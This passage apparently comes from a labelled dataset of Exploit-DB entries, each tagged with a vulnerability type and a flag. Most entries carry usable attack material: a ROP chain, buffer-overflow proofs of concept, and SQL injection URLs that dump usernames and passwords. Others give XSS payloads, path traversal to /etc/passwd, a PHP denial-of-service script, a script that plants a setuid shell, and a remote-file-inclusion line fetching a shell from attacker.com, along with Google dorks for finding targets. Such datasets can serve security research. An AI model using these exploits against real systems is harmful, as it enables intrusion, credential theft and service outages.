EAX,ESI # RETN 0x004baf26, # POP EBP # RETN 0x0046521a, # & call esp 0x00421d9e, # POP EBX # RETN 0x00000001, # 0x00000001 0x004fff88, # POP EDX # RETN 0x00001000, # 0x00001000 0x0048ab04, # POP ECX # RETN 0x00000040, # 0x00000040 0x00472066, # POP EDI # RETN 0x00500681, # RETN (ROP NOP) 0x0050be74, # POP EAX # RETN 0x90909090, # NOP 0x004d99ac, # PUSHAD # RETN </code>  Conclusion : ============ The MuPDF library is vulnerable to a stack overflow and could be exploited in this case because of two conditions :  1) the binary is non-aslr compiled allowing us to easily get a ROP chain and bypass DEP protection  2) it was compiled with /GS, maybe with an old version of Visual Studio which doesn't protect arrays of floats with stack cookies.",Stack Buffer Overflow,1
4304,"PHP 5.2.3 - PHP_ntuser ntuser_getuserlist() Local Buffer Overflow (PoC) <?php //PHP 5.2.3 php_ntuser ntuser_getuserlist() Local Buffer Overflow //author: shinnai //mail: shinnai[at]autistici[dot]org //site: http://shinnai.altervista.org  //greetz to BrainBugger Crew //http://www.brainbugger.altervista.org/  //Bug discovered with ""Footzo"" (thanks to rgod) modified.  //To download Footzo: //original link: http://godr.altervista.org/index.php?mod=Download/useful_tools#footzo.rar //alternative: http://www.shinnai.altervista.org/index.php?mod=Download/Utilities#footzo.rar  //also theese are vulnerable: //ntuser_getusergroups <-- DoS, we control EAX //ntuser_getdomaincontroller <-- DoS, we control EAX //ntuser_getuserinfo <-- BoF, we control EIP 00410041  //This is the content of registers:  //EAX FFFFFFFE //ECX 00000754 //EDX 00000041 //EBX 00223D18 //ESP 00C0FB34 UNICODE ""CCC... x 100"" //EBP 00C0FBD0 UNICODE ""CCC + DDD... x 100"" //ESI 011AC4A8 //EDI 011ADC00 //EIP 00410041  $buff    = str_repeat(""\x41"", 250);  $get_EIP = ""\x42\x42"";  $get_ESP = str_repeat(""\x43"", 100);  $get_EBP = str_repeat(""\x44"", 100);  ntuser_getuserlist($buff.$get_EIP.$get_ESP.$get_EBP); ?>  # milw0rm.com [2007-08-23]",Overflow,0
10738,"Joomla! Component com_qpersonel - Cross-Site Scripting < ------------------- header data start ------------------- >  ########################################################################### Joomla Component com_qpersonel Cross Site Scripting Vulnerabilities ###########################################################################  # Author : Pyske   # Greetz : Fl0riX , M-K-A , F0RTS3V3N , 3KB3R ,BARCOD3 and ALL Cyber-Warrior   # Name : com_qpersonel   # Bug Type : Cross Site Scripting   # Infection : Yönetici ve User cookiekleri calinabilir.   # Bug Fix Advice : Zararl&#305; karakterler filtrelenmelidir.   # Demo Vuln. : http://server/j15x/index.php?option=com_qpersonel&task=sirala&personel_sira=[XSS CODE]     #############################################################  < ------------------- header data end of ------------------- >   < -- bug code start -- >   "">   < -- bug code end of -- >",Cross-Site Scripting,1
41051,Inout SmartDeal 1.0 Script - Improper Access Restrictions # # # # #  # Vulnerability: Security Bypass # Date: 13.01.2017 # Vendor Homepage: http://www.inoutscripts.com/ # Script Name: Inout SmartDeal Script # Script Version: v1.0 # Script Buy Now: http://www.inoutscripts.com/demo/inout-smartdeal/demo/ # Author: İhsan Şencan # Author Web: http://ihsan.net # Mail : ihsan[beygir]ihsan[nokta]net # # # # #  # Direct entrance.. # An attacker can exploit this issue via a browser. # The following example URIs are available: # http://localhost/[PATH]/admin/index.php?page=account/changepassword # http://localhost/[PATH]/admin/index.php?page=country/addcountry # http://localhost/[PATH]/admin/index.php?page=account/addbank # Vs....... # # # # #,Improper Access Restrictions,1
18078,"Microsoft Excel 2003 11.8335.8333 - Use-After-Free #######################################################################                               Luigi Auriemma  Application:  Microsoft Excel               http://office.microsoft.com/en-us/excel/               http://office.microsoft.com/en-us/downloads/CD001022531.aspx Versions:     tested Office 2003 11.8335.8333 SP3 Platforms:    Windows Bug:          use after free Exploitation: file Date:         03 Nov 2011 (found 24 Aug 2011) Author:       Luigi Auriemma               e-mail: aluigi@autistici.org               web:    aluigi.org   #######################################################################   1) Introduction 2) Bug 3) The Code 4) Fix   #######################################################################  =============== 1) Introduction ===============   Excel 2003 is a spreadsheet program, part of the Office 2003 suite still supported by Microsoft.   #######################################################################  ====== 2) Bug ======   Use-after-free probably located in the code that handles the vbscript macros:    eax=00492d78 ebx=00000000 ecx=feeefeee edx=00185ff8 esi=004c72b8 edi=00492478   eip=65058591 esp=00185fd0 ebp=0018601c iopl=0         nv up ei pl nz na pe nc   cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206   VBE6!DllVbeInit+0x40f6f:   65058591 ff11            call    dword ptr [ecx]      ds:002b:feeefeee=????????   0:000:x86> k   ChildEBP RetAddr     0018601c 6501c0dd VBE6!DllVbeInit+0x40f6f   00186074 6505dee2 VBE6!DllVbeInit+0x4abb   001860a8 6505e21c VBE6!DllVbeInit+0x468c0   00186220 767cbc9c VBE6!DllVbeInit+0x46bfa   00000000 00000000 ole32!StgIsStorageFile+0x764  How to replicate: - open the proof-of-concept via web or manually - ""An error occurred while loading 'Module1'. Do you want to continue loading the project?""   select No, if you select Yes then the bug doesn't seem to be   replicable - ""Unexpected error (32790)""   select OK - ""Excel found unreadable content in ...""   Yes or No is the same - now reopen the proof-of-concept and the bug will happen immediately  The reopening of the same file seems necessary probably because the Office suite uses only one instance of its programs and performs a particular reallocation of the resources when a file gets reopened.  Note that I have tested only the latest version of Office 2003 on Windows 7.  The proof-of-concept is NOT optimized.  Modified bytes: excel_1a.xls: 0006FCA4   AA       01  excel_1b.xls: 0006FCB0   AD       40   #######################################################################  =========== 3) The Code ===========   http://aluigi.org/poc/excel_1.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/18078.zip   #######################################################################  ====== 4) Fix ======   No fix.   #######################################################################",Use-After-Free,1
31927,GlassFish Application Server - '/Applications/lifecycleModulesNew.jsf' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/29751/info       Sun Glassfish is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.       An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.       http://[HOSTNAME]:4848/applications/lifecycleModulesNew.jsf?propertyForm%3Aprope rtyContentPage%3ApropertySheet%3ApropertSectionTextField%3AnameProp%3Aname=<scri pt>alert('xss');</script>&propertyForm%3ApropertyContentPage%3ApropertySheet%3Ap ropertSectionTextField%3AclassNameProp%3Aclassname=<script>alert('xss2');</scrip t>&propertyForm%3ApropertyContentPage%3ApropertySheet%3ApropertSectionTextField% 3ApathProp%3AclassPath=&propertyForm%3ApropertyContentPage%3ApropertySheet%3Apro pertSectionTextField%3AloadOrderProp%3AloadOrder=<script>alert('xss3');</script> &propertyForm%3ApropertyContentPage%3ApropertySheet%3ApropertSectionTextField%3A descProp%3Adesc=&propertyForm%3ApropertyContentPage%3ApropertySheet%3ApropertSec tionTextField%3AstatusProp%3Asun_checkbox8=true&propertyForm%3ApropertyContentPa ge%3AbottomButtons%3AsaveButton2=++OK++&propertyForm%3AhelpKey=lifecyclemodules. html&propertyForm_hidden=propertyForm_hidden&javax.faces.ViewState=j_id117%3Aj_i d125&com_sun_webui_util_FocusManager_focusElementId=propertyForm%3ApropertyConte ntPage%3AbottomButtons%3AsaveButton2,Cross-Site Scripting,1
33919,"NolaPro Enterprise 4.0.5538 - Cross-Site Scripting / SQL Injection source: https://www.securityfocus.com/bid/39875/info  NolaPro Enterprise is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities.  Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  NolaPro Enterprise 4.0.5538 is vulnerable; other versions may also be affected.   http/www.example.com/sidemenu.php?index=1&menutitle=%3Cscript%3Ealert%28String.fromCharCode%2888,83,83,32,102,111,117,110,100,32,98,121,32,67,111,114,101,108,97,11 0,32,84,101,97,109%29%29;%3C/script%3E&menutitleorig=STR_ORDERS  http://www.example.om/nporderitemremote.php?pos_mode=1&currency=USD&curdate=2010-04-12&linenum=%3Cscript%3Ealert%28String.fromCharCode%2888,83,83,32,102,111,117,110 ,100,32,98,121,32,67,111,114,101,108,97,110,32,84,101,97,109%29%29;%3C/script%3E&inventorylocationid=1&customerid=&shiptoid=0  1 or BENCHMARK(2500000,MD5(1))",cross-site scripting vulnerabilities,1
30711,"Shttp 0.0.x - Directory Traversal source: https://www.securityfocus.com/bid/26212/info  Shttp is prone to a remote directory-traversal vulnerability.  A remote attacker can exploit this issue by using directory-traversal sequences to retrieve arbitrary files on a victim user's computer.  Versions prior to Shttp0.0.5 are vulnerable to this issue.  HEAD /../../etc/passwd HTTP/1.0  HTTP/1.1 400 Bad Request Content-Type: text/html Server: Shttp/ServerKit Date: Thu, 25 Oct 2007 16:31:30 GMT Connection: close   HEAD /../../var/log/messages HTTP/1.0  HTTP/1.1 200 OK Content-Length: 178455 Content-Type: text/plain Last-Modified: Thu, 25 Oct 2007 16:36:39 GMT Server: Shttp/ServerKit Date: Thu, 25 Oct 2007 16:42:32 GMT Connection: close",remote directory-traversal,1
10243,"PHP - MultiPart Form-Data Denial of Service (PoC) #!/usr/bin/python  # PHP MultiPart Form-Data Denial of Service proof of concept, 23-10-2009 # Bogdan Calin (bogdan@acunetix.com) # import httplib, urllib, sys, string, threading from string import replace from urlparse import urlparse  def usage():         print ""****************************************************************************""         print "" PHP MultiPart Form-Data Denial of Service proof of concept""         print "" Bogdan Calin (bogdan@acunetix.com)""         print """"         print "" Usage: php_mpfd_dos.py url [number_of_threads] [number_of_files] [data]""         print """"         print ""  [number_of_threads] - optional, default 10""         print ""  [number_of_files] - optional, default 15000""         print ""  [data] - content of the files, by default it will create files containing""         print ""           the string <?php eval($_REQUEST[x]); ?>""         print """"         print "" Example: php_mpfd_dos.py http://ubuntu/index.php""         print ""****************************************************************************""  class PhpMPFDDosThread ( threading.Thread ):         # Override Thread's __init__ method to accept the parameters needed:         def __init__ ( self, host, path, files ):                 self.host = host                 self.path = path                 self.files = files                 threading.Thread.__init__ ( self )          # run in loop         def run(self):                 while(1):                         try:                                 self.post_data()                         except:                                 print ""*"",          # post multipart_formdata         def post_data(self):             content_type, body = self.encode_multipart_formdata()             h = httplib.HTTPConnection(self.host)             headers = {                 'User-Agent': 'Opera/9.20 (php_mpfd_dos;poc)',                 'Accept': '*/*',                 'Content-Type': content_type                 }             h.request('POST', self.path, body, headers)             print ""."",          # encode multipart_formdata         def encode_multipart_formdata(self):                 """"""                 adapted from http://code.activestate.com/recipes/146306/                 files is a sequence of (name, filename, value) elements for data to be uploaded as files                 Return (content_type, body) ready for httplib.HTTP instance                 """"""                 BOUNDARY = '----------PHP_MPFD_DOS'                 CRLF = '\r\n'                 L = []                 for (key, filename, value) in self.files:                     L.append('--' + BOUNDARY)                     L.append('Content-Disposition: form-data; name=""%s""; filename=""%s""' % (key, filename))                     L.append('Content-Type: application/octet-stream')                     L.append('')                     L.append(value)                 L.append('--' + BOUNDARY + '--')                 L.append('')                 body = CRLF.join(L)                 content_type = 'multipart/form-data; boundary=%s' % BOUNDARY                 return content_type, body  def main():         if len(sys.argv)<=1:                 usage()                 sys.exit()          # default values         number_of_threads = 10         number_of_files = 15000         data = ""<?php eval($_REQUEST[x]); ?>""          if len(sys.argv)>2:                 number_of_threads = int(sys.argv[2])          if len(sys.argv)>3:                 number_of_files = int(sys.argv[3])          if len(sys.argv)>4:                 data = sys.argv[4]          url = sys.argv[1]         print ""[-] target: "" + url          # parse target url         up = urlparse(url)         host = up.netloc         path = up.path          # prepare files         files = []         for i in range(0, number_of_files):                 files.append(('fu[]', 'f'+str(i), data))          # start the threads         for x in xrange ( number_of_threads ):                 PhpMPFDDosThread(host, path, files).start()  if __name__ == '__main__':     main()",Denial of Service,1
13825,"GoodiWare GoodReader iPhone - '.XLS' Denial of Service I wrote a fuzzer ""dumb fuzzer"" and used a sample from http://www.ccp14.ac.uk/ccp/web-mirrors/bca-spreadsheets/scanplot101.xls  which I randomly found on the internet. I mutated the data and tested roughly 1000 cases on several Document Reader Applications for iPhone.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/13825.xls (goodreader_poc.xls)",Denial of Service,1
24592,"Pingtel Xpressa 1.2.x/2.0/2.1 - Handset Remote Denial of Service source: https://www.securityfocus.com/bid/11161/info  Pingtel Xpressa handsets are reported prone to a remote denial of service vulnerability. The issue is reported to exist because of a lack of sufficient boundary checks performed on HTTP request data handled by the Xpressa administration web server.   It is reported that a remote attacker may exploit this vulnerability to effectively deny service to the affected handset. Due to the nature of this vulnerability, it is reported that this issue may be exploited in order to execute arbitrary code.  GET /<buffer>/cgi/application.cgi HTTP/1.0 Authorization: Basic [base64authstring]",Handset Remote Denial of Service,1
29047,Hot Links - Perl PHP Information Disclosure source: https://www.securityfocus.com/bid/21112/info  Hot Links is prone to an information-disclosure vulnerability because it fails to authenticate the user during specific download requests.  An attacker can exploit this issue to retrieve administrative backup files. Information obtained may aid in further attacks.  All versions of Hot Links SQL-PHP and Hot Links Pro are vulnerable; other forks may also be affected.  http://www.example.com/[path]/dlback.php?dl=fullback,Perl PHP Information Disclosure,1
41438,"WordPress Plugin Mail Masta 1.0 - SQL Injection # Exploit Title: Multiple SQL injection vulnerabilities in Mail Masta (aka mail-masta) plugin 1.0 for Wordpress. # Date: 02/18/2017 # Exploit Author: Hanley Shun # Vendor Homepage: https://wpcore.com/plugin/mail-masta # Software Link: https://www.exploit-db.com/apps/78745b48b15bf2b81153556ef1c8ec48-mail-masta.zip # Version: 1.0 # Tested on: Kali Linux x64, Ubuntu 14.04 x64 # CVE : [CVE-2017-6095, CVE-2017-6096, CVE-2017-6097, CVE-2017-6098]   Mail-Masta SQL Injection  Page: ./wp-content/plugins/mail-masta/inc/lists/csvexport.php (Unauthenticated)  GET Parameter: list_id  http://my_wp_app/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/var/www/html/wordpress/wp-load.php   csvexport.php:  $list_id=$_GET['list_id']; global $wpdb; $mail_subscribers = $wpdb->prefix . ""masta_subscribers""; $masta_list = $wpdb->prefix . ""masta_list""; $check_sql = ""SELECT * FROM $mail_subscribers WHERE list_id = $list_id""; $check_list=""SELECT * FROM $masta_list WHERE list_id= $list_id""; $wp_list=$wpdb->get_results($check_sql); $wp_list_s=$wpdb->get_results($check_list);   Page: ./wp-content/plugins/mail-masta/inc/lists/view-list.php (Requires Wordpress admin)  GET Parameter: filter_list  http://my_wp_app/wp-admin/admin.php?page=masta-lists&action=view_list&filter_list=0+OR+1%3D1   view-list.php:  global $wpdb; $list_id = $_GET['filter_list']; $masta_list = $wpdb->prefix . ""masta_list""; $masta_subscribers = $wpdb->prefix . ""masta_subscribers""; $listdata = $wpdb->get_results( $wpdb->prepare(""SELECT * FROM $masta_list WHERE list_id= $list_id"",$query)); $list_subscribers = $wpdb->get_var( $wpdb->prepare(""SELECT COUNT( `list_id` ) FROM $masta_subscribers WHERE list_id= $list_id AND status=1"",$query));   Page: ./wp-content/plugins/mail-masta/inc/campaign/count_of_send.php (Requires Wordpress admin)  POST Parameter: camp_id  http://my_wp_app/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=/var/www/html/wordpress/wp-load.php   count_of_send.php:  include($_GET['pl']); global $wpdb; $camp_id=$_POST['camp_id']; $masta_reports = $wpdb->prefix . ""masta_reports""; $count=$wpdb->get_results(""SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1"");   Page: ./wp-content/plugins/mail-masta/inc/campaign_save.php (Requires Wordpress admin)  POST Parameter: list_id  campaign_save.php:  $list_id=$_POST['list_id']; $check_list = $wpdb->get_var(""SELECT count(id) FROM wp_masta_subscribers where list_id=$list_id"");   POST /wp-admin/admin-ajax.php?id= HTTP/1.1  ...snip...  action=my_action&url=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fplugins%2Fmail-masta%2Finc%2Fcampaign_save.php&sender_selected_list_check=check&list_id=1+OR+1%3D1",SQL Injection,1
12576,"Woodall Creative - SQL Injection ========================================================= Woodall Creative SQL Injection Vulnerability ========================================================= ########################################## # Name: Woodall Creative SQL Injection Vulnerability # Date: 2010-05-11 # vendor: http://www.woodallcreative.com # Author: Ashiyane Digital Security Team # Thanks to: khodam :P, Satanic2000,Veron, ... And All Ashiyane Members ... # Contact: Xrogue_p3rsi4n_hack3r[at]Hotmail[Dot]com # Home: www.Ashiyane.org ##########################################  [+] Dork:  intext: ""Site developed & mantained by Woodall Creative Group""  [+] Vulnerability: www.site.com/[path]/page.php?id=[SQLi]    [+] Live Demo: http://[site]/page.php?id=-999+union+select+1,2,3,4,5,6,7,@@version",SQL Injection,1
4729,xml2owl 0.1.1 - 'filedownload.php' Remote File Disclosure xml2owl 0.1.1 (filedownload.php) Remote File Disclosure Vulnerability D.s : http://surfnet.dl.sourceforge.net/sourceforge/xml2owl/xml2owl-0.1.1.tar.bz2 POC :      /xml2owl-0.1.1/filedownload.php?file=config.inc.php      /xml2owl-0.1.1/filedownload.php?file=../../../../../../../etc/passwd  # milw0rm.com [2007-12-13],Remote File Disclosure,1
19756,"FreeBSD 3.0/3.1/3.2/3.3/3.4 - 'Asmon'/'Ascpu' Local Privilege Escalation source: https://www.securityfocus.com/bid/996/info  A vulnerability exists in both the ascpu and asmon ports to FreeBSD. Ascpu and asmon are applets for the popular window manager AfterStep. They retain the look and feel of this window manager, and integrate well in to it's ""dock"" toolbar. As part of the port to FreeBSD, it was deemed necessary to give them access to /dev/kmem, necessitating them being installed setgid kmem. By passing a command line option, it is possible for an attacker to cause these applications to execute arbitrary commands with group 'kmem' privileges.  It should be noted that neither of these programs are truly part of FreeBSD. They are not part of any distribution of FreeBSD. Instead, they are part of the 'ports' section. The over 3000 packages included in ports are presented as-is, and in many cases have not been audited for security problems.  Exploit:  asmon -e ""xterm""",Local Privilege Escalation,1
9160,"Multiple Browsers - Denial of Service ________________________________________________________________________                       One bug to rule them all        IE5,IE6,IE7,IE8,Netscape,Firefox,Safari,Opera,Konqueror,        Seamonkey,Wii,PS3,iPhone,iPod,Nokia,Siemens.... and more.                Don't wet your pants - it's DoS only ________________________________________________________________________  Release mode: Tried hard to coordinate - gave up Reference   : [GSEC-TZO-26-2009] - One bug to rule them all WWW         : http://www.g-sec.lu/one-bug-to-rule-them-all.html Vendors         :  http://www.firefox.com    http://www.apple.com http://www.opera.com http://www.sony.com http://www.nintendo.com http://www.nokia.com http://www.siemens.com others.. Status      : Varies CVE         : CVE-2009-1692 (created by apple same root cause) Credit      : Except Apple - nobody  Affected products :  ~~~~~~~~~~~~~~~~~ - Internet Explorer 5, 6, 7, 8 (all versions) - Chrome (limited) - Opera  - Seamonkey - Midbrowser - Netscape 6 & 8 (9 years ago) - Konqueror (all versions) - Apple iPhone + iPod  - Apple Safari - Thunderbird - Nokia Phones : Nokia N95 (Symbian OS v.9.2),Nokia N82, Nokia N810 Internet Tablet - Aigo P8860 (Browser hangs and cannot be restarted)   - Siemens phones - Google T-Mobile G1 TC4-RC30 - Ubuntu (Operating system sometimes reboots, memory management failure) - possibly more devices and products that support Javascript, try it yourselves. POC here : http://www.crashthisthing.com/select.html  Patch availability : ~~~~~~~~~~~~~~~~~~ - Mozilla : Fixed in Firefox 3.0.5 and 2.0.0.19  https://bugzilla.mozilla.org/show_bug.cgi?id=460713 - Apple iPhone&iPod : patched - IE : No patch for IE5, IE6, IE7, IE8 until IE9 - Webkit : Patched in r41741 - https://bugs.webkit.org/show_bug.cgi?id=23319 - Chrome : Patched, unknown which version) - Opera : Patched after version 9.64 - Thunderbird (unknown) - Konqueror : unknown (did not respond) - Nokia : unknown, opened a case but never came back - Aigo P8860 : unknown - Siemens : unknown - Others ? Find out by visiting the POC at http://crashthisthing.com/select.html   I. Background ~~~~~~~~~~~ Quoting Wikipedia ""ECMAScript is a scripting language, standardized by Ecma  International in the ECMA-262 specification and ISO/IEC 16262. The language  is widely used on the web, especially in the form of its three best-known  dialects, JavaScript, ActionScript, and JScript.""   II. Description ~~~~~~~~~~~~~ Calling the select() method with a large integer, results in continuos allocation of x+n bytes of memory  exhausting memory after a while.  The impact varies from null pointer dereference (no more memory,hence  crashing the browser) to the reboot of the complete Operation System  (Konqueror&Ubuntu)  There had never been a limit specified as to how many html elements the select call should handle, after the report of this Bug, vendors apparently agreed to a  limit of 10.000 elements : ""Talked to some Apple and Opera guys at the  WHATWG social, and we decided this was a good number""  III. Impact ~~~~~~~~~ The Impact varies from Browser to Browser and from OS to OS.   Here is a small excerpt: - Konqueror (Ubuntu)- allocates 2GB of memory then either crashes  the Browser or (most often) the OS reboots. Ubuntu's memory management system appears to be configured as to NOT stop the process that consumes too much memory, but a random process. This sometimes leads to processes that are vital for the OS to be killed, hence the reboot. I am not kidding. Thanks to 'FX' for Memory management hint.  - Chrome :  allocates 2GB of memory then crashes tab with a null pointer  - Firefox : allocates 2GB of memory then the Browser crashes  - IE5,6,7,8 : allocates 2GB of memory then the Browser crashes  - Opera : Allocated and commits as much memory as available,  will not crash but other applications will become unstable   - Nintento WII (Opera) : Console hangs, needs hard reset Video: http://vimeo.com/2937101 (Thanks to David Raison)  - Sony PS3 - Console hangs, needs hard reset  Video: http://vimeo.com/2937101 (Thanks to Chris Gates)  - iPhone - iPhone hangs and needs hard reset Video: http://vimeo.com/2873339 (Thanks to g0tcha)  - Aigo P8860 (Browser hangs and cannot be restarted)     IV. Proof of concept  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ <script> function poc(o) {         e = document.createElement(""select"");         e.length=2147483647; }  function go() {         poc(0); } </script>  URL: http://www.crashthisthing.com/select.html  Some have not understood what this code does, it does NOT loop as some vendors claimed, it just calls select.lenght() ONCE with a huge integer. One might wonder if over the 9 last years that this bug existed, nobody ever entered a large  number in a select.lenght() call.  IV. Disclosure timeline ~~~~~~~~~~~~~~~~~~~~~~~ Nothing particular to note, except the usual discussion about availability being a security issue.  V. Thanks ~~~~~~~~~~~~~~~~~~~~~~~ Chris Gates, David Raison, Fahem Adam, a team of engineers that recognise themselves and oCert for not helping coordinate this bug.  # milw0rm.com [2009-07-15]",Denial of Service,1
5999,"PHPwebnews 0.2 MySQL Edition - 'det' SQL Injection ####################################################################################### #                                                                                                                                                                  #        ...:::::phpwebnews-mysql 0.2  SQL Injection Vulnerability ::::....                                            #                                                                                                                                                                  #######################################################################################  Virangar Security Team  www.virangar.net www.virangar.ir ================================================================================= Discoverd By :virangar security team  User In Virangar : d4v00d_cr4ck3r ================================================================================= Special TNX To:Mr.nosrati,H4di.H4di,black.shadowes,Mr.hesy,Zahra  & All virangar Members & All hackerz  ================================================================================= Download: http://www.codewalkers.com/codefiles/476_phpwebnews-mysql.zip  ================================================================================= expl0it: http://site.com/phpwebnews-mysql/bukutamu.php?det=-1/**/union/**/select/**/1,2,user,passwd,5,6,7/**/from/**/user/*  ================================================================================= Young Iranian h4ck3rz =================================================================================  # milw0rm.com [2008-07-03]",SQL Injection,1
9832,"Joomla! / Mambo Component Tupinambis - SQL Injection ####################################################### ## Mambo/Joomla SQL Injection Vulneralbility         ## ## Component : com_tupinambis 		             ## ## Release : September 23, 2009		     	     ## ## --------------------------------------------------## ##.---..-..-..-.,-..-..-..-.   .---..---..---..----. ## ##`| |'| || || . < | || || |__ | |-  \ \ `| |'| || | ## ## `-' `----'`-'`-'`----'`----'`---'`---' `-' `----' ## ##-------------------------------------------------- ## #######################################################  [+] Author	: Don Tukulesto [+] Homepage	: http://www.indonesiancoder.com [+] Location	: Republik Indonesia  #######################################################  [ Software Information ]  [+] Software      : com_tupinambis [+] Version	  : 1.0 [+] Vendor	  : www.tupinambis.net [+] Download	  : http://www.onestopjoomla.com/extensions/auction/tupinambis/ [+] Vulnerability : SQL Injection [+] Google Dork   : inurl:""com_tupinambis""  ####################################################### [ ExPL0!T ]  [+] Mambo : http://127.0.0.1/index.php?option=com_tupinambis&task=verproyecto&proyecto=-666+union+select+1,2,3,concat_ws(0x3a,username,password)tukulesto,5,6,7,8,9,10,11+from+mos_users--  [+] Joomla : http://127.0.0.1/index.php?option=com_tupinambis&task=verproyecto&proyecto=-666+union+select+1,2,3,concat_ws(0x3a,username,password)tukulesto,5,6,7,8,9,10,11+from+jos_users--  #######################################################  [ Greetings ]  [+] All of Indonesian Coder Member, M3NW5, mistersaint, gonzhack, m364tr0n, cyb3r_tr0n, TUCKER, Petrucii, Chercut,     Senot, Joker, Quick_5ilv3r, ran, m4ho666, Den Bayan, vyc0d, bh4nd55, Den Awink [+] All of Surabayahackerlink Member, Awan, Plaque, rey_cute, Tuex, XNITRO, DraCoola.com [+] ServerIsDown.org, Jack-, Yadoy666 + tante Miya, kecemplungkalen, xshadow, H4ck3rKu [+] Kill-9 Crew, kaMtiEz, Arianom, Pathloader, tiw0L, [+] V3n0m, Str0ke, sp3x, todd, Antisecurity.org, and YOU !!!  [ SHOUT ]  Happy Eidul Fitri 1430H.  Minal Aidin Wal Faidzin.  [ SP3C!AL ]  lovely Emak, Bapak, Adek ku sayang (^_^)",SQL Injection,1
6625,"Post Comments 3.0 - Insecure Cookie Handling Post Comments v3.0 Insecure Cookie Handling Vulnerability **************************** By Crackers_Child **************************** Demo : http://www.phpjabbers.com/post-comment/try/admin.php  Vendor :   by phpjabbers.com  Exploit : javascript:document.cookie = ""PostCommentsAdmin=logged; path=/""; **************************** Tum Musluman Aleminin Ramazan Bayrami Kutlu Olsun. ****************************  # milw0rm.com [2008-09-29]",Insecure Cookie Handling,1
32460,"XAMPP for Windows 1.6.8 - 'Phonebook.php' SQL Injection source: https://www.securityfocus.com/bid/31586/info  XAMPP for Windows is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  XAMPP 1.6.8 for Windows is vulnerable; other versions may also be affected.   http://www.example.com/xampp/phonebook.php?action=del&id=1 or 1",SQL Injection,1
27921,EVA-Web 2.1.2 - 'rubrique.php3?date' Cross-Site Scripting source: https://www.securityfocus.com/bid/18161/info   EVA-Web is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.    An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   These vulnerabilities are reported to affect versions 2.1.2 and earlier.  http://www.example.com/rubrique.php3?id_rubrique=29&date=[XSS],Cross-Site Scripting,1
21010,"XFree86 X11R6 3.3.2 XMan - ManPath Environment Variable Buffer Overflow source: https://www.securityfocus.com/bid/3030/info  xman is a component included with the XFree86 Window System.  A buffer overflow in the handling of the MANPATH environment variable by xman makes it possible for a local user to execute arbitrary code. By inserting 70000 characters into the MANPATH variable, it is possible to overwrite stack variables, including the return address. xman is SGID man.  This problem makes it possible for a local user to execute arbitrary code, gaining elevated privileges, and potentially root access.   #!/bin/sh # example of xman exploitation. xman # supports privileges.  but, never # drops them. # Vade79 -> v9@realhalo.org -> realhalo.org. MANPATH=~/xmantest/ mkdir -p ~/xmantest/man1 cd ~/xmantest/man1 touch ';runme;.1' cat << EOF >~/xmantest/runme #!/bin/sh cp /bin/sh ~/xmansh chown `id -u` ~/xmansh chmod 4755 ~/xmansh EOF chmod 755 ~/xmantest/runme echo ""click the ';runme;' selection,"" \ ""exit.  then, check for ~/xmansh."" xman -bothshown -notopbox rm -rf ~/xmantest",Variable Buffer Overflow,1
15739,"Easy DVD Creator - Local Crash (PoC) #### #### ####Exploit Title: Easy DVD Creator Local Crash PoC ####Software Link: http://www.divxtodvd.net/dvd-creator.htm ####Tested on: Win XP SP3 ####Date: 15-12-2010 ####Author:  h1ch4m ####Email: h1ch4m@live.fr #### ####  my $file= ""1.avi""; my $junk = ""\x41"" x 1000; open($FILE,"">$file""); print $FILE $junk; close($FILE); print ""File Created successfully\n""; sleep(1);",Local Crash,1
10275,"Kide Shoutbox 0.4.6 - Cross-Site Scripting / AXFR ##########################[andresg888]########################## #Web: : www.ilegalintrusion.net<http://www.ilegalintrusion.net> & www.bl4ck-p0rtal.org<http://www.bl4ck-p0rtal.org> ######################################################################## #Exploit : # Go to the shoutbox and type: # <font color=""red"">red text</font> # or # <marquee>hi</marquee> # or #  ######################################################################## #3xplo!t : #http://server/[path]/include/prodler.class.php?sPath=http://attacker.com/shell.txt??? ######################################################################## #Greetz : _84kur10_ , Brunos_50 #Special Thanks : all members from ilegalintrusion & black-portal ######################################################################## # It is obvious that if you allow javascript or html injection code can make a document.Inner # so with a little imagination could Defacer the site with a script. ###########################[andresg888#################################",Cross-Site Scripting,1
36441,"Citrix Command Center - Credential Disclosure Abstract   It was discovered that Citrix Command Center stores configuration files containing credentials of managed devices within a folder accessible through the web server. Unauthenticated attackers can download any configuration file stored in this folder, decode passwords stored in these files, and gain privileged access to devices managed by Command Center.  Tested version   This issue was discovered in Citrix Command Center 5.1 build 33.3 (including patch CC_SP_5.2_40_1.exe), other versions may also be vulnerable.  Fix   Citrix reports that this vulnerability is fixed in Command Center 5.2 build 42.7, which can be downloaded from the following location (login required). https://www.citrix.com/downloads/command-center/product-software/command-center-52-427.html  Citrix assigned BUG0493933 to this issue.  Introduction   Citrix Command Center is a management and monitoring solution for Citrix application networking products. Command Center enables network administrators and operations teams to manage, monitor, and troubleshoot the entire global application delivery infrastructure from a single, unified console.  Citrix Command Center stores configuration files containing credentials of managed devices within a folder accessible through the web server. No access control is enforced on this folder, an unauthenticated attacker can download any configuration file stored in this folder.  Details   Configuration files can be downloaded from the conf web folder. Below is an example of a configuration file that can be obtained this way.  https://<target>:8443/conf/securitydbData.xml  This files contains encoded 